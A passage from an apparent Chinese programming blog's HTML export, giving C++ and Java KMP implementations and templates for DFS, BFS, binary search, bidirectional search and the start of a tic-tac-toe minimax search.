class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">// string、next数组下标从1开始</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e4</span>;</span><br><span class="line"><span class="keyword">int</span> next2[maxn];</span><br><span class="line"><span class="keyword">int</span> nextval[maxn];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算next数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_next</span><span class="params">(<span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    next2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; p.size()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || p[i] == p[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next2[i] = j;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            j = next2[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算nextval数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_nextval</span><span class="params">(<span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    nextval[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; p.size()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || p[i] == p[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            <span class="keyword">if</span> (p[i] != p[j])</span><br><span class="line">                nextval[i] = j;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                nextval[i] = nextval[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            j = nextval[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// KMP算法</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//get_next(p);//计算next数组</span></span><br><span class="line">    get_nextval(p);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">1</span>;<span class="comment">//主串从第i个字符之后匹配</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; s.size() &amp;&amp; j &lt; p.size()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || s[i] == p[j]) &#123;<span class="comment">//模式串首字符失配或相同继续匹配</span></span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//失配</span></span><br><span class="line">            j = nextval[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j &gt;= p.size())<span class="comment">//找到</span></span><br><span class="line">        <span class="keyword">return</span> i - p.size() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">string</span> s = <span class="string">" acabaabaabcacaabc"</span>, t = <span class="string">" abaabcac"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; kmp(s, t);</span><br><span class="line">    <span class="comment">/*for (int i = 1; i &lt; t.size(); i++) &#123;</span></span><br><span class="line"><span class="comment">        cout &lt;&lt; next2[i] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-Java"><a href="#2-2-Java" class="headerlink" title="2.2 Java"></a>2.2 Java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KMP</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] next = <span class="keyword">new</span> <span class="keyword">int</span>[maxn];</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] nextval = <span class="keyword">new</span> <span class="keyword">int</span>[maxn];</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">KMP</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算next数组</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get_next</span><span class="params">(String p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">        next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; p.length()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span> || p.charAt(i) == p.charAt(j)) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">                next[i] = j;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算nextval数组</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">get_nextval</span><span class="params">(String p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">        nextval[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; p.length() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span> || p.charAt(i) == p.charAt(j)) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">                <span class="keyword">if</span> (p.charAt(i) != p.charAt(j))</span><br><span class="line">                    nextval[i] = j;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    nextval[i] = nextval[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                j = nextval[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// KMP算法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kmp</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//get_next(p);//计算next数组</span></span><br><span class="line">        get_nextval(p);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">1</span>;<span class="comment">//主串从第i个字符之后匹配</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; s.length() &amp;&amp; j &lt; p.length()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span> || s.charAt(i) == p.charAt(j)) &#123;<span class="comment">//模式串首字符失配或相同继续匹配</span></span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">//失配</span></span><br><span class="line">                j = nextval[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= p.length())<span class="comment">//找到</span></span><br><span class="line">            <span class="keyword">return</span> i - p.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO自动生成的方法存根</span></span><br><span class="line">    KMP test = <span class="keyword">new</span> KMP();</span><br><span class="line">        String s = <span class="string">" acabaabaabcacaabc"</span>, t = <span class="string">" abaabcac"</span>;</span><br><span class="line">        System.out.println(test.kmp(s, t));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-题目列表"><a href="#3-题目列表" class="headerlink" title="3 题目列表"></a>3 题目列表</h1><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td></tr></tbody></table></div><h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h1><ul><li><a href="https://www.bilibili.com/video/BV16X4y137qw?from=search&amp;seid=428213560995313343" target="_blank" rel="noopener">KMP算法之求next数组代码讲解</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索</title>
      <link href="/2021/04/10/%E6%90%9C%E7%B4%A2/"/>
      <url>/2021/04/10/%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-DFS"><a href="#1-DFS" class="headerlink" title="1 DFS"></a>1 DFS</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(参数)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(满足条件)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        判断边界</span><br><span class="line">        &#123;</span><br><span class="line">            相应操作</span><br><span class="line">        &#125;</span><br><span class="line">        尝试每一种可能</span><br><span class="line">        &#123;</span><br><span class="line">               满足check条件</span><br><span class="line">               标记</span><br><span class="line">               继续下一步dfs(step+<span class="number">1</span>)</span><br><span class="line">               恢复初始状态（回溯的时候要用到）</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-BFS"><a href="#2-BFS" class="headerlink" title="2 BFS"></a>2 BFS</h1><p>BFS使用队列，把每个还没有搜索到的点一次放入队列，然后再弹出队列的头部元素当做当前遍历点。当不需要确定当前遍历层数时：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>.push(s)<span class="comment">//压入起点，初始队列可能有多个起点</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">queue</span> 不空：</span><br><span class="line">    cur = <span class="built_in">queue</span>.pop()</span><br><span class="line">    <span class="keyword">for</span> 节点 in cur的所有相邻节点：</span><br><span class="line">        <span class="keyword">if</span> 该节点有效且未访问过：</span><br><span class="line">            <span class="built_in">queue</span>.push(该节点)</span><br></pre></td></tr></table></figure><p>当需要确定遍历层数时，这里增加了level表示当前遍历到二叉树中的哪一层了，也可以理解为在一个图中，现在已经走了多少步了。size表示在开始遍历新的一层时，队列中有多少个元素，即有多少个点需要向前走一步。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>.push(s)<span class="comment">//压入起点</span></span><br><span class="line">level = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">queue</span> 不空：</span><br><span class="line">    size = <span class="built_in">queue</span>.size()</span><br><span class="line">    <span class="keyword">while</span> (size --) &#123;</span><br><span class="line">        cur = <span class="built_in">queue</span>.pop()</span><br><span class="line">        <span class="keyword">for</span> 节点 in cur的所有相邻节点：</span><br><span class="line">            <span class="keyword">if</span> 该节点有效且未被访问过：</span><br><span class="line">                <span class="built_in">queue</span>.push(该节点)</span><br><span class="line">    &#125;</span><br><span class="line">    level ++</span><br></pre></td></tr></table></figure><h1 id="3-二分"><a href="#3-二分" class="headerlink" title="3 二分"></a>3 二分</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在[l, h)范围内查找值v(l&gt;=0),返回下标,假设a数组已经按从⼩到⼤排序,失败返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bs</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> l, <span class="keyword">int</span> h, <span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"><span class="keyword">while</span> (l &lt; h)&#123;</span><br><span class="line">m = (l + h) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (a[m] == v)&#123;</span><br><span class="line"><span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a[m] &lt; v)&#123;</span><br><span class="line">l = m + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">h = m;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-双向搜索"><a href="#4-双向搜索" class="headerlink" title="4 双向搜索"></a>4 双向搜索</h1><p>起点是给出的，终点也是已知的，需要确定能否从起点到达终点，如果可以，需要多少步。</p><p>如果我们用常规的搜索方法，从起点开始往下搜，那得到的解答树可能非常庞大，这样漫无目的的搜索就像<strong>大海捞针</strong>。让我们切换一下思路，既然终点是已知的，我们何必让它闲着呢？我们完全可以<strong>分别</strong>从起点和终点出发，看它们能否<strong>相遇</strong>。</p><p>如果原本的解答树规模是 <img alt="[公式]" data-src="https://www.zhihu.com/equation?tex=a%5En" class="lozad"> ，使用双向搜索后，规模立刻缩小到了约 <img alt="[公式]" data-src="https://www.zhihu.com/equation?tex=2a%5E%7Bn%2F2%7D" class="lozad"> ，当 <img alt="[公式]" data-src="https://www.zhihu.com/equation?tex=n" class="lozad"> 较大时优化非常可观。</p><p>双向搜索主要有两种，双向BFS和双向迭代加深。</p><h2 id="4-1-双向BFS"><a href="#4-1-双向BFS" class="headerlink" title="4.1 双向BFS"></a>4.1 双向BFS</h2><p>与普通的BFS不同，双向BFS维护两个而不是一个队列，然后<strong>轮流</strong>拓展两个队列。同时，用<strong>数组</strong>（如果状态可以被表示为较小的整数）或<strong>哈希表</strong>记录当前的搜索情况，给从两个方向拓展的节点以不同的标记。当某点被两种标记同时标记时，搜索结束。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>&lt;T&gt; Q[<span class="number">3</span>]; <span class="comment">// T要替换为用来表示状态的类型，可能为int，string还有bitset等</span></span><br><span class="line"><span class="keyword">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">Q[<span class="number">1</span>].push(st); <span class="comment">// st为起始状态</span></span><br><span class="line">Q[<span class="number">2</span>].push(ed); <span class="comment">// ed为终止状态</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">0</span>; d &lt; D + <span class="number">2</span>; ++d) <span class="comment">// D为最大深度，最后答案为d-1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> dir = (d &amp; <span class="number">1</span>) + <span class="number">1</span>, sz = Q[dir].size(); <span class="comment">// 记录一下当前的搜索方向，1为正向，2为反向</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sz; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> x = Q[dir].front();</span><br><span class="line">        Q[dir].pop();</span><br><span class="line">        <span class="keyword">if</span> (H[x] + dir == <span class="number">3</span>) <span class="comment">// H是数组或哈希表，若H[x]+dir==3说明两个方向都搜到过这个点</span></span><br><span class="line">            found = <span class="literal">true</span>;</span><br><span class="line">        H[x] = dir;</span><br><span class="line">        <span class="comment">// 这里需要把当前状态能够转移到的新状态压入队列</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (found)</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-双向迭代加深"><a href="#4-2-双向迭代加深" class="headerlink" title="4.2 双向迭代加深"></a>4.2 双向迭代加深</h2><p>迭代加深算法是那种，听名字非常高端，思想和实现却都很简单的算法。就是控制dfs的最大深度，如果深度超过最大深度就返回。某个深度搜完后没有得到答案便令最大深度+1，然后重新开始搜索。</p><p>这听起来好像效果跟广搜差不多啊？还重复搜索了很多次。但是，由于搜索的时间复杂度几乎完全由解答树的最后一层确定（看上面第一张图就能感悟到），所以它与BFS在时间上只有常数级别的差距，以此换来的优势是：空间占用很小，有时候方便剪枝、方便传参等。</p><p>双向迭代加深就是相应地，从两个方向迭代加深搜索。先从起点开始搜0层，再从终点开始搜0层，然后从起点开始搜1层……</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> D;</span><br><span class="line"><span class="keyword">bool</span> found;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">dfs</span>(<span class="title">T</span> <span class="title">x</span>, <span class="title">int</span> <span class="title">d</span>, <span class="title">int</span> <span class="title">dir</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (H[x] + dir == <span class="number">3</span>)</span><br><span class="line">        found = <span class="literal">true</span>;</span><br><span class="line">    H[x] = dir;</span><br><span class="line">    <span class="keyword">if</span> (d == D)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 这里需要递归搜索当前状态能够转移到的新状态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在main函数中...</span></span><br><span class="line"><span class="keyword">while</span> (D &lt;= MAXD / <span class="number">2</span>) <span class="comment">// MAXD为题中要求的最大深度</span></span><br><span class="line">&#123;</span><br><span class="line">    dfs(st, <span class="number">0</span>, <span class="number">1</span>); <span class="comment">// st为起始状态</span></span><br><span class="line">    <span class="keyword">if</span> (found)</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">// 题中所给最大深度为奇数时这里要判断一下</span></span><br><span class="line">    dfs(ed, <span class="number">0</span>, <span class="number">2</span>); <span class="comment">// ed为终止状态</span></span><br><span class="line">    <span class="keyword">if</span> (found)</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    D++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/119349440" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/119349440</a></p><h1 id="5-极大极小值搜索算法"><a href="#5-极大极小值搜索算法" class="headerlink" title="5 极大极小值搜索算法"></a>5 极大极小值搜索算法</h1><p>简单的对抗搜索</p><p>评估函数的返回值直接设定成题目中的评估得分即可</p><p>在博弈树搜索时，先手返回能向下递归所得的最大值，后手反之返回最小值</p><p>如果某种状态已经分出胜负或者平手，就说明该种状态就是博弈树中的叶子节点，需要计算评估得分进行返回</p><p>数据很小可以不用alpha-beta剪枝</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(x,a,b) for(int x=(a);x&lt;=(b);x++)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn][maxn];<span class="comment">//棋盘 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//计算评估分数，-2000代表还能继续进行棋局</span></span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    rep(i,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">        rep(j,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">            x+=(a[i][j]==<span class="number">0</span>);</span><br><span class="line">    rep(i,<span class="number">0</span>,<span class="number">2</span>)&#123;<span class="comment">//A或B获胜 </span></span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>]==<span class="number">1</span>&amp;&amp;a[i][<span class="number">1</span>]==<span class="number">1</span>&amp;&amp;a[i][<span class="number">2</span>]==<span class="number">1</span>) <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>]==<span class="number">2</span>&amp;&amp;a[i][<span class="number">1</span>]==<span class="number">2</span>&amp;&amp;a[i][<span class="number">2</span>]==<span class="number">2</span>) <span class="keyword">return</span> -x<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>][i]==<span class="number">1</span>&amp;&amp;a[<span class="number">1</span>][i]==<span class="number">1</span>&amp;&amp;a[<span class="number">2</span>][i]==<span class="number">1</span>) <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>][i]==<span class="number">2</span>&amp;&amp;a[<span class="number">1</span>][i]==<span class="number">2</span>&amp;&amp;a[<span class="number">2</span>][i]==<span class="number">2</span>) <span class="keyword">return</span> -x<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//A或B获胜 </span></span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>][<span class="number">0</span>]==<span class="number">1</span>&amp;&amp;a[<span class="number">1</span>][<span class="number">1</span>]==<span class="number">1</span>&amp;&amp;a[<span class="number">2</span>][<span class="number">2</span>]==<span class="number">1</span>) <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>][<span class="number">2</span>]==<span class="number">1</span>&amp;&amp;a[<span class="number">1</span>][<span class="number">1</span>]==<span class="number">1</span>&amp;&amp;a[<span class="number">2</span>][<span class="number">0</span>]==<span class="number">1</span>) <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>][<span class="number">0</span>]==<span class="number">2</span>&amp;&amp;a[<span class="number">1</span>][<span class="number">1</span>]==<span class="number">2</span>&amp;&amp;a[<span class="number">2</span>][<span class="number">2</span>]==<span class="number">2</span>) <span class="keyword">return</span> -x<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>][<span 